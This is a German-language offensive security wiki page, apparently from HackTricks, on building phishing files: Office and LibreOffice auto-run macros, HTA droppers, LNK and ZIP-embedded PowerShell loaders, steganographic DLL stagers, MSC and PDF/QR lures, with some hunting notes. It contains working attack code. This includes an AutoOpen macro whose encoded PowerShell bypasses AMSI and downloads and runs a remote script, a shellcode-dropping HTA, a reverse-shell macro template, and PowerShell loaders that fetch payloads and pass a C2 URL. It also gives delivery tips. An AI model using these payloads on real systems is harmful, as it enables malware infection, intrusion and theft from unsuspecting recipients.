# Phishing-Dateien & Dokumente

{{#include ../../banners/hacktricks-training.md}}

## Office-Dokumente

Microsoft Word führt vor dem Öffnen einer Datei eine Validierung ihrer Daten durch. Dabei werden Datenstrukturen anhand des OfficeOpenXML-Standards identifiziert. Tritt bei der Identifizierung der Datenstruktur ein Fehler auf, wird die analysierte Datei nicht geöffnet.

Word-Dateien mit Makros verwenden normalerweise die Erweiterung `.docm`. Es ist jedoch möglich, die Dateierweiterung zu ändern und die Makrofunktionalität beizubehalten.\
Eine RTF-Datei unterstützt beispielsweise von Haus aus keine Makros. Eine in RTF umbenannte DOCM-Datei wird jedoch von Microsoft Word verarbeitet und kann Makros ausführen.\
Dieselben Interna und Mechanismen gelten für alle Programme der Microsoft Office Suite (Excel, PowerPoint usw.).

Mit dem folgenden Befehl kannst du prüfen, welche Erweiterungen von bestimmten Office-Programmen ausgeführt werden:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX-Dateien, die auf eine Remote-Vorlage verweisen (Datei – Optionen – Add-Ins – Verwalten: Vorlagen – Los), die Makros enthält, können ebenfalls Makros „ausführen“.

### Externes Laden von Bildern

Gehe zu: _Einfügen --> Schnellbausteine --> Feld_\
_**Kategorien**: Verknüpfungen und Verweise, **Feldnamen**: includePicture und **Dateiname oder URL**:_ http://<ip>/whatever

![Office-Dokumente – Externes Laden von Bildern: Gehe zu: Einfügen -- Schnellbausteine -- Feld](<../../images/image (155).png>)

Informationen zur Analyse eines empfangenen Dokuments anstelle der Erstellung eines Dokuments findest du unter [VBA-Makroanalyse: Junk-Code und UserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms).

### Makro-Backdoor

Mit Makros kann beliebiger Code aus dem Dokument ausgeführt werden.

#### Autoload-Funktionen

Je häufiger sie vorkommen, desto wahrscheinlicher werden sie von der AV erkannt.

- AutoOpen()
- Document_Open()

#### Beispiele für Makrocode

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Metadaten manuell entfernen

Gehe zu **Datei > Informationen > Dokument überprüfen > Dokument überprüfen**, um den Dokumentinspektor zu öffnen. Klicke auf **Überprüfen** und dann neben **Dokumenteigenschaften und persönliche Informationen** auf **Alle entfernen**.

#### Doc-Erweiterung

Wähle anschließend im Dropdown-Menü **Dateityp** das Format **Word 97–2003 `.doc`** statt **`.docx`** aus.\
Der Grund: **In einer `.docx`-Datei können keine Makros gespeichert werden**, und die makrofähige Erweiterung **`.docm`** ist **mit einem Stigma behaftet** (z. B. hat das Miniaturansichtssymbol ein großes `!`, und manche Web-/E-Mail-Gateways blockieren solche Dateien vollständig). Daher ist die **ältere `.doc`-Erweiterung der beste Kompromiss**.

#### Generatoren für bösartige Makros

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice-ODT-Makros mit automatischer Ausführung (Basic)

LibreOffice-Writer-Dokumente können Basic-Makros einbetten und sie beim Öffnen der Datei automatisch ausführen, indem das Makro an das Ereignis **Dokument öffnen** gebunden wird (Extras → Anpassen → Ereignisse → Dokument öffnen → Makro…).<sup>[[1]](#references)</sup> Ein einfaches Reverse-Shell-Makro sieht so aus:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Beachte die doppelten Anführungszeichen (`""`) innerhalb der Zeichenfolge – LibreOffice Basic verwendet sie, um wörtliche Anführungszeichen zu escapen. Daher bleiben bei Payloads, die mit `...==""")` enden, sowohl der innere Befehl als auch das Shell-Argument korrekt abgegrenzt.

Tipps zur Zustellung:

- Speichere die Datei als `.odt` und binde das Makro an das Dokumentereignis, damit es sofort beim Öffnen ausgeführt wird.
- Verwende beim E-Mail-Versand mit `swaks` `--attach @resume.odt` (das `@` ist erforderlich, damit die Dateibytes und nicht die Zeichenfolge des Dateinamens als Anhang gesendet werden). Dies ist entscheidend, wenn SMTP-Server ausgenutzt werden, die beliebige `RCPT TO`-Empfänger ohne Validierung akzeptieren.

## HTA-Dateien

Eine HTA ist ein Windows-Programm, das **HTML und Skriptsprachen (wie VBScript und JScript) kombiniert**. Es erzeugt die Benutzeroberfläche und wird als „vollständig vertrauenswürdige“ Anwendung ausgeführt, ohne den Einschränkungen des Sicherheitsmodells eines Browsers zu unterliegen.

Eine HTA wird mit **`mshta.exe`** ausgeführt, die typischerweise zusammen mit **Internet Explorer installiert** wird. Daher ist **`mshta` von IE abhängig**. Wenn IE deinstalliert wurde, können HTAs nicht mehr ausgeführt werden.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Gefälschte Anhangkarten in HTML-E-Mails

Eine HTML-E-Mail kann die native Anhangvorschaukarte eines Anbieters nachahmen, statt einen echten Anhang zu enthalten. Talos beobachtete eine nachgebildete Gmail-Karte, die aus vier Base64-kodierten Inline-PNG-MIME-Teilen bestand. Das gesamte visuelle Element war in einem einzigen Anchor eingeschlossen, und ein Empfängerwert in `?m=<target-id>` ermöglichte Tracking pro Empfänger. Der Link begann mit `//` statt mit `http://` oder `https://`; Browser lösen diese protokollrelative Form auf, URL-Extraktoren, die nur vollständig qualifizierte URLs erkennen, können sie jedoch übersehen.<sup>[[11]](#references)</sup>

Untersuche bei der Analyse das rohe MIME, statt der gerenderten Anhangsliste zu vertrauen. Rekonstruiere, wie die Inline-Bildteile die visuelle Karte bilden, ermittle den sie umschließenden Anchor und normalisiere protokollrelative `href`-Werte, bevor du URLs extrahierst.<sup>[[11]](#references)</sup>

Informationen zu Spoofing von Envelope-/Header-Absendern und DMARC-Alignment-Tests findest du unter [SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## NTLM-Authentifizierung erzwingen

Es gibt mehrere Möglichkeiten, **NTLM-Authentifizierung „remote“ zu erzwingen**. Zum Beispiel könntest du **unsichtbare Bilder** in E-Mails oder HTML einfügen, auf die der Benutzer zugreifen wird (sogar über HTTP MitM?). Oder du sendest dem Opfer die **Adresse von Dateien**, die eine **Authentifizierung** auslösen, sobald der **Ordner geöffnet wird**.

**Weitere Ideen und mehr findest du auf den folgenden Seiten:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Vergiss nicht, dass du nicht nur den Hash oder die Authentifizierung stehlen, sondern auch **NTLM-Relay-Angriffe durchführen** kannst:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK für `ftp.exe`-Staging lokaler Befehle

Eine Verknüpfung kann `ftp.exe -s:icon.ico` starten, wobei eine Textbefehlsdatei durch eine Bilddateiendung getarnt ist.<sup>[[12]](#references)</sup> Die Option `-s:` liest lokale FTP-Befehle; unter Windows 8 und höher muss diese Datei UTF-8-kodiert sein.<sup>[[13]](#references)</sup> Eine mit `!` beginnende Zeile führt einen lokalen Befehl über `cmd /c` aus, ohne diesen Befehl an einen FTP-Server zu senden. Für diesen lokalen Ausführungspfad ist keine FTP-Verbindung erforderlich.<sup>[[14]](#references)</sup> In der beschriebenen Angriffskette führte das FTP-Skript zu einer zweiten Befehlsdatei. Die vollständige `!`-Zeile ist entscheidend: `!more res.ico` allein zeigt die Datei an, während eine Pipe zu `cmd` ihren Inhalt ausführt.<sup>[[12]](#references)[[14]](#references)</sup>

Dieselbe Angriffskette verwendete eine wiederkehrende Aufgabe, um eine beschreibbare Befehlsdatei erneut auszulesen, statt für jedes Update eine neue ausführbare Datei zu installieren. Die Aktion der Aufgabe lautete `conhost --headless cmd /c more C:\Users\Public\Music\err.log|cmd`; die Datei enthielt einen Befehl, der beim Ausführen Anweisungen abrief. Eine verwandte Variante lud vor einem geplanten Lauf eine ersetzte Befehlsdatei herunter. Die Datei muss vorhanden und lesbar sein, wenn die Aufgabe ausgelöst wird; `conhost` erhöht die Berechtigungen der Aufgabe nicht über das konfigurierte Benutzertoken hinaus.<sup>[[12]](#references)</sup> Informationen zur Funktionsweise von Aufgaben findest du unter [scheduled-task execution](../../windows-hardening/lateral-movement/atexec.md).

## VHDX-Verknüpfung mit verstecktem MSI und Köderdokument

Ein eingebundenes VHDX kann eine sichtbare LNK anzeigen und gleichzeitig ein MSI sowie eine Köder-Tabelle im selben Volume verbergen. In der beschriebenen Angriffskette verwendete die LNK `cmd.exe /c Visa_Details.msi & Attachment-2.xls`. Der Trenner `&` öffnet den Köder auch dann, wenn der Installer-Befehl fehlschlägt; das Öffnen des Dokuments ist kein Beleg für eine erfolgreiche Installation. Dies ist eine Bereitstellungsvariante der [MSI custom-action execution](../../windows-hardening/windows-local-privilege-escalation/create-msi-with-wix.md), keine MSI-Privilege-Escalation an sich.<sup>[[12]](#references)</sup>

Bei diesem MSI kombiniert `CustomAction.Type` **194** eine in der `Binary`-Tabelle gespeicherte EXE (**2**) mit den Flags „Rückgabecode ignorieren“ (**64**) und „asynchron“ (**128**). Die Kombination **64 + 128** bedeutet, dass Windows Installer nicht auf den Abschluss der EXE wartet; allein mit dem Flag 128 würde bis zum Ende der Sequenz gewartet.<sup>[[15]](#references)[[16]](#references)</sup> Prüfe die `Source` der Aktion anhand der `Binary`-Tabelle sowie ihre Position in `InstallExecuteSequence`, bevor du die Ausführung dieser eingebetteten EXE annimmst.<sup>[[12]](#references)[[15]](#references)</sup> Ein [WebDAV-UNC-Pfad kann ein Remote-MSI bereitstellen](../../network-services-pentesting/pentesting-web/put-method-webdav.md#remote-msi-from-a-webdav-unc-path), doch das ist ein anderer Einstiegspunkt.

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Sehr effektive Kampagnen liefern ein ZIP, das zwei legitime Köderdokumente (PDF/DOCX) und eine schädliche .lnk-Datei enthält. Der Trick besteht darin, dass der eigentliche PowerShell-Loader nach einer eindeutigen Markierung in den Rohdaten des ZIPs gespeichert ist und die .lnk ihn extrahiert und vollständig im Speicher ausführt.<sup>[[2]](#references)</sup>

Typischer Ablauf des von der .lnk implementierten PowerShell-One-Liners:

1) Das ursprüngliche ZIP in üblichen Verzeichnissen suchen: Desktop, Downloads, Documents, %TEMP%, %ProgramData% und im übergeordneten Verzeichnis des aktuellen Arbeitsverzeichnisses.
2) Die ZIP-Bytes lesen und eine fest codierte Markierung suchen (z. B. xFIQCV). Alles nach der Markierung ist der eingebettete PowerShell-Payload.
3) Das ZIP nach %ProgramData% kopieren, dort entpacken und das Köder-.docx öffnen, damit der Vorgang legitim wirkt.
4) AMSI für den aktuellen Prozess umgehen: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Die nächste Stufe deobfuskieren (z. B. alle # Zeichen entfernen) und im Speicher ausführen.

Beispiel für ein PowerShell-Grundgerüst zum Extrahieren und Ausführen der eingebetteten Stufe:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Hinweise
- Die Zustellung missbraucht häufig seriöse PaaS-Subdomains (z. B. *.herokuapp.com) und kann Payloads nach bestimmten Kriterien ausliefern (etwa harmlose ZIPs anhand der IP/UA bereitstellen).
- Die nächste Stufe entschlüsselt häufig Base64-/XOR-Shellcode und führt ihn über Reflection.Emit + VirtualAlloc aus, um Artefakte auf der Festplatte zu minimieren.

In derselben Angriffskette verwendete Persistenz
- COM-TypeLib-Hijacking des Microsoft Web Browser-Steuerelements, damit IE/Explorer oder jede andere App, die es einbettet, die Payload automatisch erneut startet.<sup>[[2]](#references)[[4]](#references)</sup> Details und sofort verwendbare Befehle gibt es hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP-Dateien, an deren Archivdaten die ASCII-Markierungszeichenfolge (z. B. xFIQCV) angehängt ist.
- Eine .lnk-Datei, die übergeordnete Ordner und Benutzerordner durchsucht, um die ZIP-Datei zu finden, und ein Köderdokument öffnet.
- AMSI-Manipulation über [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Lang laufende geschäftliche E-Mail-Verläufe, die mit Links zu vertrauenswürdigen PaaS-Domains enden.

## LNK-Staging mit Köder zuerst → Persistenz über geplante Aufgabe → CPL-Sideloading über vertrauenswürdige Dateien

Ein weiteres wiederkehrendes Muster ist eine **dokumentgetarnte `.lnk`-Datei**, die sofort einen harmlosen Köder öffnet, während sie im Hintergrund die eigentliche Angriffskette vorbereitet.<sup>[[3]](#references)</sup>

Beobachteter Ablauf:
1. Die Verknüpfung **gibt sich als PDF aus** und verwendet `conhost.exe` oder einen ähnlichen Proxy, um einen verschleierten PowerShell-Downloader zu starten.
2. PowerShell zerlegt offensichtliche Token (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), sodass einfache Erkennungen, die nach `iwr`, `gci`, `ren`, `cpi` oder `schtasks` suchen, den Befehl übersehen.
3. Der Stager lädt **zuerst das Köderdokument** herunter, öffnet es für das Opfer und setzt dann im Hintergrund die schädlichen Dateien wieder zusammen.
4. Payloads können mit **unscheinbaren Dateiendungen** gespeichert und anschließend umbenannt werden, indem Füllzeichen entfernt werden. Dadurch erscheinen offensichtliche `.exe`-/.cpl-Artefakte erst verzögert.
5. Die Persistenz wird über eine **minütlich ausgeführte geplante Aufgabe** eingerichtet, die eine vertrauenswürdige Host-Binärdatei aus einem für Benutzer beschreibbaren Pfad startet.

Minimale Hunting-Hinweise zu diesem Muster:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Ein nützliches Staging-Layout, das man erkennen sollte:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` oder `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Warum die zweite Stufe unauffällig ist

In der Fallstudie von Rapid7 startete die geplante Aufgabe wiederholt **`Fondue.exe`** aus `C:\Users\Public\`. Da **`APPWIZ.cpl`** daneben abgelegt war und **`RunFODW`** exportierte, lud die vertrauenswürdige Microsoft-Binärdatei die Angreifer-CPL per Side-Loading anstelle der legitimen Systemkopie.

Die CPL:
- Liest einen **AES-256-CBC**-Blob aus `C:\Windows\Tasks\editor.dat`
- Entschlüsselt ihn über **Windows CNG / `bcrypt.dll`**
- Allokiert ausführbaren Speicher und kopiert den entschlüsselten Shellcode hinein
- Führt ihn indirekt aus, indem sie den Shellcode-Zeiger als Callback für **`EnumUILanguagesW`** übergibt

Dieser letzte Schritt ist es wert, separat danach zu suchen: Malware vermeidet oft einen direkten Sprung wie `((void(*)())buf)()` und missbraucht stattdessen eine **legitime WinAPI, die einen Callback entgegennimmt**, um die Ausführung zu übertragen.

Die entschlüsselte Payload in dieser Kampagne war **Donut**-Shellcode, der anschließend die endgültige PE vollständig im Speicher abbildete und **AMSI/WLDP/ETW** im aktuellen Prozess patchte, bevor er die Ausführung übergab. Weitere Hinweise zu Side-Loading und speicherresidenter Nachbearbeitung finden Sie hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktische Ansatzpunkte für die Suche:
- `.lnk`-Dateien, die `powershell.exe` oder `conhost.exe` starten, gefolgt von einem sichtbaren Täuschungsdokument.
- Kurzlebige Downloads nach **`C:\Users\Public\`**, gefolgt von sofortigen Umbenennungen mit unsinnigen Erweiterungen.
- Geplante Aufgaben mit unauffälligen Namen wie `GoogleErrorReport`, die aus **benutzerschreibbaren Verzeichnissen** ausgeführt werden.
- Vertrauenswürdige Binärdateien, die **`.cpl` / `.dll`**-Dateien aus demselben Nicht-Systemverzeichnis laden.
- Base64-Textblobs, die unter **`C:\Windows\Tasks\`** geschrieben und anschließend vom per Side-Loading geladenen Modul gelesen werden.

## Durch Steganografie abgegrenzte Payloads in Bildern (PowerShell-Stager)

Aktuelle Loader-Ketten liefern ein verschleiertes JavaScript/VBS aus, das einen Base64-PowerShell-Stager dekodiert und ausführt. Dieser Stager lädt ein Bild herunter (häufig ein GIF), das eine Base64-kodierte .NET-DLL als Klartext zwischen eindeutigen Start-/Endmarkierungen verbirgt. Das Skript sucht nach diesen Begrenzungen (in freier Wildbahn beobachtete Beispiele: «<<sudo_png>> … <<sudo_odt>>>»), extrahiert den dazwischenliegenden Text, dekodiert ihn per Base64 zu Bytes, lädt die Assembly in den Speicher und ruft eine bekannte Einstiegsmethode mit der C2-URL auf.<sup>[[5]](#references)</sup>

Ablauf
- Stufe 1: Archivierter JS/VBS-Dropper → dekodiert eingebettetes Base64 → startet den PowerShell-Stager mit -nop -w hidden -ep bypass.
- Stufe 2: PowerShell-Stager → lädt ein Bild herunter, extrahiert Base64 zwischen Markierungen, lädt die .NET-DLL in den Speicher und ruft ihre Methode auf (z. B. VAI) und übergibt dabei die C2-URL und Optionen.
- Stufe 3: Der Loader ruft die endgültige Payload ab und injiziert sie typischerweise per Process Hollowing in eine vertrauenswürdige Binärdatei (häufig MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Weitere Informationen zu Process Hollowing und zur Proxy-Ausführung über vertrauenswürdige Hilfsprogramme finden Sie hier:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell-Beispiel zum Extrahieren einer DLL aus einem Bild und zum Aufrufen einer .NET-Methode im Speicher:

<details>
<summary>PowerShell-Extractor und -Loader für Stego-Payloads</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Hinweise
- Dies ist ATT&CK T1027.003 (Steganografie/Marker-Verstecken).<sup>[[6]](#references)</sup> Marker unterscheiden sich zwischen Kampagnen.
- AMSI/ETW-Bypass und String-Deobfuscation werden häufig vor dem Laden der Assembly angewendet.
- Threat Hunting: Heruntergeladene Bilder nach bekannten Begrenzungszeichen durchsuchen; PowerShell-Prozesse identifizieren, die auf Bilder zugreifen und unmittelbar Base64-Blobs decodieren.

Siehe auch Stego-Tools und Carving-Techniken:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS-Droppers → Base64-PowerShell-Staging

Eine wiederkehrende Anfangsstufe ist eine kleine, stark obfuskierte `.js`- oder `.vbs`-Datei, die in einem Archiv zugestellt wird. Ihr einziger Zweck besteht darin, einen eingebetteten Base64-String zu decodieren und PowerShell mit `-nop -w hidden -ep bypass` zu starten, um die nächste Stufe über HTTPS zu laden.<sup>[[5]](#references)</sup>

Skelettlogik (abstrakt):
- Eigenen Dateiinhalt lesen
- Einen Base64-Blob zwischen bedeutungslosen Strings finden
- In ASCII-PowerShell decodieren
- Mit `wscript.exe`/`cscript.exe` ausführen, das `powershell.exe` aufruft

Hinweise für die Suche
- Archivierte JS/VBS-Anhänge, die `powershell.exe` mit `-enc`/`FromBase64String` in der Befehlszeile starten.
- `wscript.exe`, das `powershell.exe -nop -w hidden` aus temporären Benutzerverzeichnissen startet.

## MSC-Dokumente als Ausführungscontainer (GrimResource)

Microsoft Management Console-Dateien (`.msc`) sind XML-Konsolendefinitionen, die normalerweise mit `mmc.exe` geöffnet werden. **GrimResource** missbraucht eine `StringTable`-Referenz auf eine `apds.dll`-Ressource mit einem alten XSS-Primitiv. Dadurch wird beim Öffnen der manipulierten Konsole durch einen Benutzer JavaScript innerhalb von `mmc.exe` ausgeführt. Bei beobachteten Samples wurden `transformNode`-basierte Obfuskation und **DotNetToJScript** kombiniert, um eine .NET-Payload ohne den üblichen Office-Makro-Pfad zu instanziieren.<sup>[[9]](#references)</sup>

Behandle ein nicht vertrauenswürdiges MSC für die statische Triage als Text und doppelklicke **nicht** darauf:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

High-Signal-Runtime-Pivots sind, wenn `mmc.exe` die CLR oder Skriptkomponenten lädt, Netzwerkverbindungen herstellt oder `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` oder eine unerwartete ausführbare Datei startet. Das Format ist legitim. Erkennungen sollten daher **Herkunft + verdächtigen XML-/Skriptinhalt + Verhalten von `mmc.exe`** korrelieren, statt jede MSC-Datei zu blockieren.<sup>[[9]](#references)</sup>

## PDF-/QR-Weiterleitungen und Payload-Gating

Ein PDF braucht keinen Exploit, um nützlich zu sein. Aktuelle Kampagnen platzieren einen **QR-Code oder gewöhnlichen Link** in einem harmlos wirkenden Dokument, leiten die Browsersitzung aus den Mail-Schutzmechanismen heraus und personalisieren das Ziel anhand der Empfängeradresse. Microsoft dokumentierte 2025 PDFs, deren QR-URLs pro Empfänger eindeutig waren und zu einer Infrastruktur für den Diebstahl von RaccoonO365-Anmeldedaten führten. Eine parallele Angriffskette nutzte IP-/Umgebungs-Gating, um ausgewählten Besuchern einen JavaScript-/MSI-Pfad, Scannern oder nicht zugelassenen Clients hingegen ein harmloses PDF zurückzugeben.<sup>[[10]](#references)</sup>

Untersuche sowohl PDF-Aktionen als auch gerenderte QR-Codes. Ein QR-Code kann als Vektorgrafik gezeichnet sein, statt als extrahierbares Bild gespeichert zu werden. Rasterisiere daher jede Seite und extrahiere zusätzlich eingebettete Bilder:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Untersuchen Sie dekodierte Ziele und Weiterleitungen von einem isolierten Analysesystem aus, ohne sich zu authentifizieren. Nützliche Merkmale für die Suche sind PDFs, die ausschließlich QR-Codes enthalten, bei nahezu leeren E-Mail-Texten, die E-Mail-Adresse des Empfängers in einem Query-Parameter, mehrere Weiterleitungen über renommierte Hosting-Anbieter sowie unterschiedliche Inhalte je nach IP, Geolokalisierung, Cookies, Referrer oder User-Agent. Vergleichen Sie Anfragen mit kontrollierten Profilen, da ein einzelner Sandbox-Abruf möglicherweise nur die Tarnseite erhält.<sup>[[10]](#references)</sup>

## Windows-Dateien zum Stehlen von NTLM-Hashes

Schauen Sie auf der Seite über **Orte zum Stehlen von NTLM-Credentials** nach:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice-Makro → IIS-webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine-Kampagne: Eine ausgeklügelte Phishing-Attacke gegen US-Unternehmen](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Dropping Elephants Tradecraft über eine China-Themen-Loader-Kette verfolgen](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Neue COM-Persistenztechnik (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader liefert eine Reihe von Infostealern](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganografie (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console für initialen Zugriff und Umgehung](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Bedrohungsakteure nutzen die Steuersaison für steuerbezogene Phishing-Kampagnen](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – UAT-11587-Zustellungskette und Antino-Backdoor](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
- [12] [FortiGuard Labs - BITTER erweitert sein Arsenal um PapRAT](https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat)
